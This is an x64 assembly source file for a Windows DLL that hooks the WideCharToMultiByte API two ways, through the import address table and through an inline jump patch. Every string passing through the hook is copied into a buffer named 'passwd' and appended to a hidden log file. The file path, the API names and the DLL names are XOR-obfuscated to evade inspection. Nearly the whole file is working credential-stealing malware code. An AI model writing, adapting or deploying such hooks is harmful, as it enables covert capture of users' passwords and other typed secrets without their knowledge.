DEFAULT REL

section .text
global DllMain

global hook_iat
export hook_iat

global hook_inline_patch
export hook_inline_patch

%include '../utils/utils_64_text.asm'

; arg0: CodePage            rcx
; arg1: dwFlags             rdx
; arg2: ccWideChar          r8
; arg3: lpWideCharStr       r9
; arg4: lpMultiByteStr      [rsp + 32]
; arg5: cbMultiByte         [rsp + 40]
; arg6: lpDefaultChar       [rsp + 48]
; arg7: lpUseDefaultChar    [rsp + 56]
;
; return: num bytes written rax
hooked_wide_char_to_multi_byte_inline_patch:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx             ; code page
    mov [rbp + 24], rdx             ; dwflags
    mov [rbp + 32], r8              ; lpWideCharStr
    mov [rbp + 40], r9              ; ccWideCHar 

    ; rbp - 8 = return value
    ; rbp - 16 = bytes written
    ; rbp - 24 = text file handle
    ; rbp - 32 = 8 bytes padding
    sub rsp, 32                     ; allocate local variable space
    sub rsp, 32                     ; allocate 32 byte shadow space

    ; restore the original function code, so it be called to 
    ; continue the normal workflow
    sub rsp, 16                     ; 1 arg + padding
    mov rcx, -1                     ; current proc id
    mov rdx, [wide_char_to_multi_byte]
    mov r8, original_func_bytes
    mov r9, original_func_bytes.len
    mov qword [rsp + 32], 0
    call [write_process_memory]
    add rsp, 16                     ; 1 arg + padding

    cmp rax, 0                      ; did WriteProcessMemory fail ?
    je .error_shutdown

    ; call the original function
    sub rsp, 64                     ; 4 args 

    mov rcx, [rbp + 16]             ; code page
    mov rdx, [rbp + 24]             ; dwflags
    mov r8, [rbp + 32]              ; lpWideCharStr
    mov r9d, [rbp + 40]             ; ccWideChar

    mov rax, [rbp + 48]             ; lpMultibyteStr
    mov [rsp + 32], rax

    mov eax, [rbp + 56]             ; ccMultiByte
    mov [rsp + 40], rax

    mov rax, [rbp + 64]             ; lpDefaultChar
    mov qword [rsp + 48], rax 

    mov rax, [rbp + 72]             ; lpUseDefaultChar
    mov qword [rsp + 56], rax

    call [wide_char_to_multi_byte]  ; bytes written in rax
    add rsp, 64                     ; 4 args

    cmp rax, 0                      ; did function fail ?
    je .error_shutdown

    mov [rbp - 16], rax             ; bytes written

    mov rcx, file_path_xor
    mov rdx, file_path_xor.len
    mov r8, xor_key
    mov r9, xor_key.len
    call my_xor

    sub rsp, 64                     ; 3 args + padding
    mov rcx, file_path_xor
    mov rdx, FILE_APPEND_DATA
    mov r8, FILE_SHARE_READ
    xor r9, r9
    mov qword [rsp + 32], OPEN_ALWAYS
    mov qword [rsp + 40], FILE_ATTRIBUTE_NORMAL
    mov qword [rsp + 48], 0
    call [create_file_a]            ; file handle
    add rsp, 64                     ; 3 args + padding

    cmp rax, INVALID_HANDLE_VALUE   ; did CreateFileA fail ?
    je .error_shutdown

    mov [rbp - 24], rax             ; file handle

    mov rcx, [rbp + 48]             ; lpmulti_byteStr
    mov rdx, passwd
    call strcpy

    ; replace trailing zero with '\n' (0xa) (line feed)
    mov rax, passwd
    mov rcx, [rbp - 16]             ; bytes written
    dec rcx
    add rax, rcx
    mov byte [rax], 0xa             ; new line ascii

    sub rsp, 16                     ; 1 arg + 8 byte padding
    mov rcx, [rbp - 24]             ; file handle
    mov rdx, passwd
    mov r8, [rbp - 16]              ; bytes written
    xor r9, r9
    mov qword [rsp + 32], 0
    call [write_file]
    add rsp, 16                     ; 1 arg + 8 byte padding

    cmp rax, 0                      ; did write file fail ?
    je .error_shutdown

.error_shutdown:
    call [get_last_error]

.shutdown:
    mov rcx, [rbp - 24]             ; file handle
    call [close_handle]

    add rsp, 32                     ; free 32 byte shadow space
    add rsp, 32                     ; free local variable space

    leave
    ret

; arg0: CodePage            rcx
; arg1: dwFlags             rdx
; arg2: ccWideChar          r8
; arg3: lpWideCharStr       r9
; arg4: lpMultiByteStr      [rsp + 32]
; arg5: cbMultiByte         [rsp + 40]
; arg6: lpDefaultChar       [rsp + 48]
; arg7: lpUseDefaultChar    [rsp + 56]
;
; return: num bytes written rax
hooked_wide_char_to_multi_byte_iat:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx             ; code page
    mov [rbp + 24], rdx             ; dwflags
    mov [rbp + 32], r8              ; lpWideCharStr
    mov [rbp + 40], r9              ; ccWideChar

    ; rbp - 8 = return value
    ; rbp - 16 = bytes written
    ; rbp - 24 = text file handle
    ; rbp - 32 = 8 bytes padding
    sub rsp, 32                     ; allocate local variable space
    sub rsp, 32                     ; allocate 32 byte shadow space

    ; call the original function
    sub rsp, 64                     ; 4 args
    mov rcx, [rbp + 16]             ; code page
    mov rdx, [rbp + 24]             ; dw flags
    mov r8, [rbp + 32]              ; lpWideCharStr
    mov r9d, dword [rbp + 40]       ; ccWideChar

    mov rax, [rbp + 48]             ; lpMultiByteStr
    mov [rsp + 32], rax

    mov rax, [rbp + 56]             ; ccMultiByte
    mov [rsp + 40], rax

    mov rax, [rbp + 64]             ; lpDefaultChar
    mov [rsp + 48], rax

    mov rax, [rbp + 72]             ; lpUseDefaultChar
    mov [rsp + 56], rax

    call [wide_char_to_multi_byte]  ; bytes written in rax

    add rsp, 64                     ; 4 args

    cmp rax, 0                      ; did function fail ?
    je .shutdown

    mov [rbp - 16], rax             ; bytes written
    
    mov rcx, file_path_xor
    mov rdx, file_path_xor.len
    mov r8, xor_key
    mov r9, xor_key.len
    call my_xor

    sub rsp, 64                     ; 3 args + padding
    mov rcx, file_path_xor
    mov rdx, FILE_APPEND_DATA
    mov r8, FILE_SHARE_READ
    xor r9, r9
    mov qword [rsp + 32], OPEN_ALWAYS
    mov qword [rsp + 40], FILE_ATTRIBUTE_NORMAL
    mov qword [rsp + 48], 0
    call [create_file_a]            ; file handle
    add rsp, 64                     ; 3 args + padding

    cmp rax, INVALID_HANDLE_VALUE   ; did CreateFileA fail ?
    je .error_shutdown

    mov [rbp - 24], rax             ; file handle

    mov rcx, [rbp + 48]             ; lpmulti_byteStr
    mov rdx, passwd
    call strcpy

    ; replace trailing zero with '\n' (0xa) (line feed)
    mov rax, passwd
    mov rcx, [rbp - 16]             ; bytes written
    dec rcx
    add rax, rcx
    mov byte [rax], 0xa             ; new line ascii

    ; write the text to the file
    sub rsp, 16                     ; 1 arg + 8 byte padding
    mov rcx, [rbp - 24]             ; file handle
    mov rdx, passwd
    mov r8, [rbp - 16]              ; bytes written
    xor r9, r9
    mov qword [rsp + 32], 0
    call [write_file]
    add rsp, 16                     ; 1 arg + 8 byte padding

    cmp rax, 0                      ; did write file fail ?
    je .error_shutdown

.error_shutdown:
    call [get_last_error]

.shutdown:
    mov rcx, [rbp - 24]             ; file handle
    call [close_handle]

    add rsp, 32                     ; free 32 byte shadow space
    add rsp, 32                     ; free local variable space

    leave
    ret

hook_iat:
    push rbp
    mov rbp, rsp

    ; rbp - 8 = return value
    ; rbp - 16 = kernel module hnd
    ; rbp - 24 = dbgHelp module hnd
    ; rbp - 32 = ImageDirectoryEntryToDataEx proc add
    ; rbp - 40 = executable base addr
    ; rbp - 48 = import descriptor count
    ; rbp - 56 = first image import descriptor
    ; rbp - 64 = dll_index
    ; rbp - 72 = bool dll found
    ; rbp - 80 = image thunk data
    ; rbp - 88 = &dwOldProtect
    ; rbp - 96 = 8 bytes padding
    sub rsp, 96                         ; allocate local variable space
    sub rsp, 32                         ; allocate shadow space

    ; get kernel module handle
    call get_kernel_module_handle

    cmp rax, 0                          ; kernel module not found ?
    je .shutdown

    mov qword [rbp - 16], rax           ; kernel module hnd

    ; populate kernel function pointers
    mov rcx, [rbp - 16]                 ; kernel module hnd
    call populate_kernel_function_ptrs_by_name

    ; UnXor WideCharToMultiByte function string
    mov rcx, wide_char_to_multi_byte_xor
    mov rdx, wide_char_to_multi_byte_xor.len
    mov r8, xor_key
    mov r9, xor_key.len
    call my_xor

    ; get addr of WideCharTomulti_byte
    mov rcx, [rbp - 16]
    mov rdx, wide_char_to_multi_byte_xor
    call [get_proc_addr]

    cmp rax, 0                          ; was WideCharTomulti_byte not found ?
    je .shutdown

    mov [wide_char_to_multi_byte], rax  ; save proc addr

    ; UnXor DbgHelp dll string
    mov rcx, debug_help_xor
    mov rdx, debug_help_xor.len
    mov r8, xor_key
    mov r9, xor_key.len
    call my_xor

    ; load the dbghelp library
    mov rcx, debug_help_xor
    call [load_library_a]

    cmp rax, 0                          ; was dbghelp dll not loaded ?
    je .shutdown

    mov [rbp - 24], rax                 ; dbghelp mod hnd

    ; UnXor ImageDirectoryEntryToDataEx function string
    mov rcx, image_directory_entry_to_data_ex_xor
    mov rdx, image_directory_entry_to_data_ex_xor.len
    mov r8, xor_key
    mov r9, xor_key.len
    call my_xor

    ; get addr of ImageDirectoryEntryToDataEx
    mov rcx, [rbp - 24]                 ; dbghelp mod hnd
    mov rdx, image_directory_entry_to_data_ex_xor
    call [get_proc_addr]

    cmp rax, 0                          ; was addr not found ?
    je .shutdown

    mov [rbp - 32], rax                 ; ImageDirectoryEntryToDataEx proc addr

    ; Get base addr of the current executable
    mov rcx, 0 
    call [get_module_handle_a]

    cmp rax, 0                          ; is exec base addr 0 ?
    je .shutdown

    mov [rbp - 40], rax                 ; exec base addr

    ; Get first ImageImportDescriptor
    sub rsp, 16                         ; 1 arg + 8 byte padding
    mov rcx, [rbp - 40]                 ; exec base addr
    mov rdx, 1
    mov r8, 1                           ; IMAGE_DIRECTORY_ENTRY_IMPORT
    mov r9, rbp
    sub r9, 48                          ; &import descriptor count
    mov qword [rsp + 32], 0
    call [rbp - 32]                     ; ImageDirectoryEntryToDataEx()
    add rsp, 16                         ; 1 arg + 8 byte padding

    mov [rbp - 56], rax                 ; first image import descriptor

    mov qword [rbp - 64], 0             ; dll index = 0
    mov r10d, [rbp - 48]                ; import descriptor count
    mov qword [rbp - 72], 0             ; dll found = false

    ; Loop through ImageImportDescriptors
.module_loop:
    mov rax, [rbp - 64]                 ; dll index
    mov rcx, 20                         ; size of image import descriptor
    mul rcx                             ; size * index to point to an item in array
    add rax, [rbp - 56]                 ; add offset to first image import descriptor

    add rax, 12                         ; offset image import descriptor name rva
    mov eax, [rax]                      ; name rva
    mov rdx, [rbp - 40]                 ; base addr
    add rax, rdx                        ; base addr + name rva = ptr to dll name string

    mov rcx, rax
    mov rdx, kernel32_xor
    mov r8, kernel32_xor.len
    call strcmpiAA

    cmp rax, 1                          ; are strings equal ?
    je .module_found

    inc qword [rbp - 64]                ; ++ dll index
    dec r10
    cmp qword r10, 0
    jne .module_loop

    jmp .shutdown

.module_found:
    mov qword [rbp - 72], 1             ; dll found = true

    mov rax, [rbp - 64]                 ; dll index
    mov rcx, 20                         ; size of image import descriptor
    mul rcx                             ; size * index to offset into array
    add rax, [rbp - 56]                 ; first image import descriptor
    add rax, 16                         ; Offset of FirstThunk withing ImageImportDescriptor 
    mov eax, dword [rax]                ; ImageImportDescriptor[dllIndex].FirstThunk

    add rax, [rbp - 40]                 ; + exec base addr = ptr to image thunk data

    mov [rbp - 80], rax                 ; ptr to image thunk data

    ; loop through imported functions of the the dll

    mov rax, [rax]                      ; *image thunk data (u1.Function)
    jmp .while_condition

.module_func_loop:
    add qword [rbp - 80], 8             ; ++pImageThunkData
    mov rax, [rbp - 80]

    mov rax, [rax]                      ; *image thunk data (u1.Function)
    cmp rax, [wide_char_to_multi_byte]  ; is func addr == WideCharToMultiByte
    je .func_addr_found

    .while_condition:
        cmp rax, 0                      ; is funct addr == 0 ?
        jne .module_func_loop

    jmp .shutdown

.func_addr_found:
    ; Change the protection of the IAT to PAGE_READWRITE so we
    ; can overwrite the func addr with the addr of our hooking func
    mov rcx, [rbp - 80]                 ; ptr to image thunk data
    mov rdx, 4096                       ; number of bytes
    mov r8, PAGE_READWRITE
    mov r9, rbp
    sub r9, 88                          ; &dwOldProtect
    call [virtual_protect]

    cmp rax, 0                          ; did virtual protect fail ?
    je .shutdown

    mov rax, [rbp - 80]                 ; ptr to image thunk data
    mov rcx, hooked_wide_char_to_multi_byte_iat
    mov [rax], rcx

    mov rcx, [rbp - 80]                 ; ptr to image thunk data
    mov rdx, 4096                       ; number of bytes
    mov r8, [rbp - 88]                  ; dwOldProtect
    mov r9, rbp
    sub r9, 88                          ; &dwOldProtect
    call [virtual_protect]

    cmp rax, 0                          ; did virtual protect fail ?
    je .shutdown

.shutdown:
    mov rax, [rbp - 8]                  ; return value

    add rsp, 32                         ; free shadow space
    add rsp, 96                         ; free local variable space

    leave
    ret

hook_inline_patch:
    push rbp
    mov rbp, rsp
    
    ; rbp - 8 = return value
    ; rbp - 16 = kernel handle
    ; rbp - 32 = patch
    sub rsp, 32                         ; allocate local variable space
    sub rsp, 32                         ; allocate shadow space

    mov qword [rbp - 8], 0              ; return value

    call get_kernel_module_handle       ; kernel handle

    cmp rax, 0                          ; kernel handle == 0 ?
    je .shutdown

    mov [rbp - 16], rax                 ; kernel handle

    mov rcx, [rbp - 16]
    call populate_kernel_function_ptrs_by_name

    mov rcx, wide_char_to_multi_byte_xor
    mov rdx, wide_char_to_multi_byte_xor.len
    mov r8, xor_key
    mov r9, xor_key.len
    call my_xor

    mov rcx, [rbp - 16]                 ; kernel handle
    mov rdx, wide_char_to_multi_byte_xor
    call [get_proc_addr]                ; proc addr

    cmp rax, 0                          ; is proc addr = 0 ?
    je .shutdown

    mov [wide_char_to_multi_byte], rax   ; proc addr

    ; read the original function code
    sub rsp, 16                         ; 1 arg + padding
    mov rcx, -1                         ; current process
    mov rdx, [wide_char_to_multi_byte]  ; ptr to function
    mov r8, original_func_bytes         ; ptr to original bytes
    mov r9, original_func_bytes.len     ; num bytes
    mov qword [rsp + 32], 0             ; NULL
    call [read_process_memory]          
    add rsp, 16                         ; 1 args + padding

    cmp rax, 0                          ; did ReadProcessMemory fail ?
    je .shutdown

    ; create patch
    mov rax, rbp
    sub rax, 32                         ; patch addr
    mov dword [rax], 0x25ff
    add rax, 4
    mov word [rax], 0
    add rax, 2
    mov rcx, hooked_wide_char_to_multi_byte_inline_patch
    mov qword [rax], rcx

    ; overwrite the original code with the patch
    sub rsp, 16                         ; 1 arg + padding
    mov rcx, -1                         ; current process
    mov rdx, [wide_char_to_multi_byte]  ; ptr to function
    mov r8, rbp
    sub r8, 32                          ; patch
    mov r9, original_func_bytes.len     ; num bytes
    mov qword [rsp + 32], 0             ; NULL
    call [write_process_memory]
    add rsp, 16                         ; 1 arg + padding

    cmp rax, 0                          ; did WriteProcessMemory fail ?
    je .shutdown

.shutdown:

    mov rax, [rbp - 8]                  ; return value

    add rsp, 32                         ; free shadow space
    add rsp, 32                         ; free local variable space

    leave
    ret

; arg0: hInstance       rcx
; arg1: dwReason        rdx
; arg2: reserved        r8
;
; return: BOOL          rax
DllMain:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                     ; hInstance
    mov [rbp + 24], rdx                     ; dwReason
    mov [rbp + 32], r8                      ; reserved

    cmp qword [rbp + 24], 1                 ; PROCESS_ATTACH
    jne .continue_from_process_attach

    jmp .shutdown

.continue_from_process_attach:
    cmp qword [rbp + 24], 0                 ; PROCESS_DETACH
    jne .continue_from_process_detach

    jmp .shutdown

.continue_from_process_detach:
.shutdown:
    mov rax, 1

    leave
    ret

section .data
wide_char_to_multi_byte_xor: db 0x67, 0x59, 0x54, 0x55, 0x73, 0x58, 0x51, 0x42, 0x64, 0x5f, 0x7d, 0x45, 0x5c, 0x44, 0x59, 0x72, 0x49, 0x44, 0x55, 0x0
.len equ $ - wide_char_to_multi_byte_xor - 1

debug_help_xor: db 0x54, 0x52, 0x57, 0x58, 0x55, 0x5c, 0x40, 0x1e, 0x54, 0x5c, 0x5c, 0x0
.len equ $ - debug_help_xor - 1

image_directory_entry_to_data_ex_xor: db 0x79, 0x5d, 0x51, 0x57, 0x55, 0x74, 0x59, 0x42, 0x55, 0x53, 0x44, 0x5f, 0x42, 0x49, 0x75, 0x5e, 0x44, 0x42, 0x49, 0x64, 0x5f, 0x74, 0x51, 0x44, 0x51, 0x75, 0x48, 0x0
.len equ $ - image_directory_entry_to_data_ex_xor - 1


file_path_xor: db 0x73, 0xa, 0x6c, 0x6c, 0x62, 0x64, 0x7f, 0x6c, 0x6c, 0x40, 0x47, 0x5f, 0x42, 0x54, 0x1e, 0x44, 0x48, 0x44, 0x0
.len equ $ - file_path_xor - 1

%include '../utils/utils_64_data.asm'

section .bss
wide_char_to_multi_byte: dq ?
original_func_bytes: resb 14
.len equ $ - original_func_bytes
passwd: resb 128

%include '../utils/utils_64_bss.asm'